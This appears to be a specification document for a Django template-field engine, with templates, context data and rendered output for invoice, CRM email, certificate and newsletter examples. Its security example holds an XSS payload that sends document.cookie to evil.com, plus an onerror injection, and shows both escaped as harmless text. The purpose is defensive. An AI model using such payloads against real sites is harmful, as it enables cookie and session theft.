# Dynamic Template Field System — Examples & Usage

> **Status:** Specification · **Version:** 1.0

## Overview

This document provides concrete examples of templates, context data,
and rendered output for each product (POS, CRM, LMS, Landing). Every
example shows the template source, the context that feeds it, and the
final rendered result.

## Example 1 — POS Invoice

### Template source

```html
<div class="fu-pos-receipt">
  <div class="fu-pos-receipt__header">
    <h3>{{ company.name }}</h3>
    <div class="meta">
      Invoice #{{ invoice.number }}<br>
      {{ invoice.date|date:"M d, Y" }}<br>
      {{ company.address|default:"" }}
    </div>
  </div>
  <div class="fu-pos-receipt__items">
    <ul>
      <li>
        <span class="name">2x {{ product.name|default:"Unknown" }}</span>
        <span class="price">{{ order.line_total|currency:"USD" }}</span>
      </li>
    </ul>
  </div>
  <div class="fu-pos-receipt__totals">
    <div class="row grand">
      <span>Total</span>
      <span>{{ order.total|currency:"USD" }}</span>
    </div>
  </div>
</div>
```

### Context data

```python
context = {
    "company": {
        "name": "Formint Coffee Co.",
        "address": "123 Main St, Portland, OR",
    },
    "invoice": {
        "number": "INV-2024-0042",
        "date": datetime(2024, 1, 15),
    },
    "product": {
        "name": "Premium Espresso",
    },
    "order": {
        "line_total": Decimal("14.00"),
        "total": Decimal("14.00"),
    },
}
```

### Rendered output

```html
<div class="fu-pos-receipt">
  <div class="fu-pos-receipt__header">
    <h3>Formint Coffee Co.</h3>
    <div class="meta">
      Invoice #INV-2024-0042<br>
      Jan 15, 2024<br>
      123 Main St, Portland, OR
    </div>
  </div>
  <div class="fu-pos-receipt__items">
    <ul>
      <li>
        <span class="name">2x Premium Espresso</span>
        <span class="price">$14.00</span>
      </li>
    </ul>
  </div>
  <div class="fu-pos-receipt__totals">
    <div class="row grand">
      <span>Total</span>
      <span>$14.00</span>
    </div>
  </div>
</div>
```

## Example 2 — CRM Email (with fallback)

### Template source

```html
<div class="email-body">
  <p>Hi {{ customer.name|default:"there" }},</p>

  <p>Thank you for your interest in {{ company.name }}. Your deal
     ({{ deal.title }}) is now in the
     <strong>{{ deal.stage|title }} stage</strong>.</p>

  <p>Estimated value: {{ deal.value|currency:"USD" }}</p>
  <p>Next step: {{ deal.next_step|default:"Schedule a follow-up call" }}</p>

  <p>Best regards,<br>{{ agent.name }}</p>
</div>
```

### Context data

```python
context = {
    "customer": {
        "name": "Martha Maldonado",
    },
    "company": {
        "name": "Loop CRM",
    },
    "deal": {
        "title": "Enterprise Plan — Acme Corp",
        "stage": "negotiation",
        "value": Decimal("48000"),
        "next_step": None,  # missing — will use fallback
    },
    "agent": {
        "name": "John Due",
    },
}
```

### Rendered output

```html
<div class="email-body">
  <p>Hi Martha Maldonado,</p>

  <p>Thank you for your interest in Loop CRM. Your deal
     (Enterprise Plan — Acme Corp) is now in the
     <strong>Negotiation stage</strong>.</p>

  <p>Estimated value: $48,000.00</p>
  <p>Next step: Schedule a follow-up call</p>

  <p>Best regards,<br>John Due</p>
</div>
```

### Validation issues (preview mode)

```text
[
  WARNING: deal.next_step — Required field used fallback
           "Schedule a follow-up call" (source: default)
]
```

## Example 3 — LMS Certificate

### Template source

```html
<div class="certificate">
  <div class="certificate__seal">
    <img src="{{ company.logo_url|default:'/static/default-logo.png' }}" alt="logo">
  </div>
  <h1>Certificate of Completion</h1>
  <p>This certifies that</p>
  <h2>{{ student.name|upper }}</h2>
  <p>has successfully completed</p>
  <h3>{{ course.title }}</h3>
  <p>on {{ enrollment.completed_at|date:"F j, Y" }}</p>

  <div class="certificate__meta">
    <span>Certificate #: {{ certificate.number }}</span>
    <span>Instructor: {{ instructor.name|default:"—" }}</span>
  </div>
</div>
```

### Context data

```python
context = {
    "company": {
        "logo_url": "/media/logos/precis.png",
    },
    "student": {
        "name": "Alexander Hamilton",
    },
    "course": {
        "title": "React Front to Back",
    },
    "enrollment": {
        "completed_at": datetime(2024, 3, 20),
    },
    "certificate": {
        "number": "CERT-2024-0156",
    },
    "instructor": {
        # name is missing — will use fallback "—"
    },
}
```

### Rendered output

```html
<div class="certificate">
  <div class="certificate__seal">
    <img src="/media/logos/precis.png" alt="logo">
  </div>
  <h1>Certificate of Completion</h1>
  <p>This certifies that</p>
  <h2>ALEXANDER HAMILTON</h2>
  <p>has successfully completed</p>
  <h3>React Front to Back</h3>
  <p>on March 20, 2024</p>

  <div class="certificate__meta">
    <span>Certificate #: CERT-2024-0156</span>
    <span>Instructor: —</span>
  </div>
</div>
```

## Example 4 — Landing Newsletter (chained filters)

### Template source

```html
<div class="newsletter">
  <h1>{{ post.title|upper }}</h1>
  <p class="lede">{{ post.excerpt|truncate:120 }}</p>

  <div class="author">
    By {{ author.name|default:"Editorial Team" }} ·
    {{ post.published_at|date:"M d" }}
  </div>

  <a href="{{ post.url|url_encode }}" class="fu-btn fu-btn--primary">
    Read more
  </a>
</div>
```

### Context data

```python
context = {
    "post": {
        "title": "Building Better APIs with Django and Astro",
        "excerpt": "In this comprehensive guide we explore how to combine Django's robust backend with Astro's island architecture for blazing-fast content sites that don't sacrifice developer experience.",
        "published_at": datetime(2024, 6, 10),
        "url": "/blog/building-better-apis",
    },
    "author": {
        # name missing — fallback to "Editorial Team"
    },
}
```

### Rendered output

```html
<div class="newsletter">
  <h1>BUILDING BETTER APIS WITH DJANGO AND ASTRO</h1>
  <p class="lede">In this comprehensive guide we explore how to combine Django's robust backend with Astro's island architecture for blazing-fa…</p>

  <div class="author">
    By Editorial Team ·
    Jun 10
  </div>

  <a href="/blog/building-better-apis" class="fu-btn fu-btn--primary">
    Read more
  </a>
</div>
```

## Example 5 — Security: XSS attempt blocked

### Template source

```html
<p>Welcome back, {{ customer.name }}!</p>
<p>Your order: {{ order.notes }}</p>
```

### Context data (malicious)

```python
context = {
    "customer": {
        "name": '<script>document.location="https://evil.com?c="+document.cookie</script>',
    },
    "order": {
        "notes": '<img src=x onerror="alert(\'hacked\')">',
    },
}
```

### Rendered output (escaped)

```html
<p>Welcome back, &lt;script&gt;document.location=&quot;https://evil.com?c=&quot;+document.cookie&lt;/script&gt;!</p>
<p>Your order: &lt;img src=x onerror=&quot;alert(&#x27;hacked&#x27;)&quot;&gt;</p>
```

**The script and event handler are rendered as text, not executed.**

## Example 6 — Security: blocked data source

### Template source

```html
<p>API Key: {{ settings.SECRET_KEY }}</p>
<p>User: {{ request.user.email }}</p>
```

### Schema

```json
{
  "allowed_sources": ["customer", "order", "company"]
}
```

### Rendered output

```html
<p>API Key: </p>
<p>User: </p>
```

### Validation issues

```text
[
  ERROR: settings.SECRET_KEY — Blocked data source "settings"
  ERROR: request.user.email — Blocked data source "request"
]
```

## Example 7 — Preview mode

### API call

```python
result = engine.preview(
    template_name="invoice_template",
    sample_context={
        "company": {"name": "Sample Corp"},
        "invoice": {"number": "SAMPLE-001", "date": timezone.now()},
        "order": {"total": Decimal("99.99")},
        "customer": {},  # name intentionally missing
    },
)
```

### PreviewResult

```python
PreviewResult(
    html='<div class="fu-template-preview">'
          '<div class="fu-template-preview__watermark">PREVIEW</div>'
          '<div class="fu-template-preview__issues">'
          '<ul>'
          '<li class="issue--warning">customer.name: Required field '
          'used fallback "Guest" (source: default)</li>'
          '</ul>'
          '</div>'
          '<div class="fu-template-preview__content">'
          '<!-- rendered HTML here -->'
          '</div>'
          '</div>',
    issues=[
        ValidationIssue(
            level=IssueLevel.WARNING,
            field="customer.name",
            message='Required field used fallback "Guest"',
            line=3,
        ),
    ],
    resolved_count=3,
    unresolved_count=1,
    is_valid=True,
    pass_rate=0.75,
)
```

## Usage in Python (django-fusion integration)

```python
from django_fusion.template_fields import TemplateFieldEngine

# Create the engine
engine = TemplateFieldEngine()

# Parse a template (extracts all {{ }} tokens)
refs = engine.parse(template_html)
# → [FieldReference("customer.name", ...), FieldReference("order.total", ...)]

# Resolve against context
resolved = engine.resolve(refs, context={"customer": {"name": "Alice"}})
# → {"customer.name": ResolvedValue("Alice", resolved=True)}

# Validate against schema
issues = engine.validate(resolved, schema=template.field_schema)
# → [ValidationIssue(WARNING, "order.total", "Required field missing")]

# Render (full pipeline)
html = engine.render(template_html, context)
# → "<p>Invoice for Alice. Total: </p>"

# Preview (with watermark + issues)
preview = engine.preview(template_html, sample_context)
# → PreviewResult(html=..., issues=[...], pass_rate=0.5)
```

## Django settings

```python
# settings.py

TEMPLATE_FIELD_ENGINE = {
    "max_list_length": 1000,
    "max_string_length": 10000,
    "max_render_time_ms": 5000,
    "max_tokens": 500,
    "auto_escape": True,        # always True in production
    "allowed_url_schemes": [
        "https", "http", "mailto", "tel",
    ],
    "custom_filters": {
        # dotted path to filter functions
        "filesize": "myapp.template_filters.filesize",
        "mask_email": "myapp.template_filters.mask_email",
    },
}
```

## Registering custom filters

```python
from django_fusion.template_fields import FilterRegistry

@FilterRegistry.register("mask_email")
def mask_email(value, args=None):
    """Mask an email for privacy: alice@acme.com → a***@acme.com"""
    if not value or "@" not in str(value):
        return str(value or "")
    name, domain = str(value).split("@", 1)
    return f"{name[0]}***@{domain}"

# Usage in template:
# {{ customer.email|mask_email }}
```
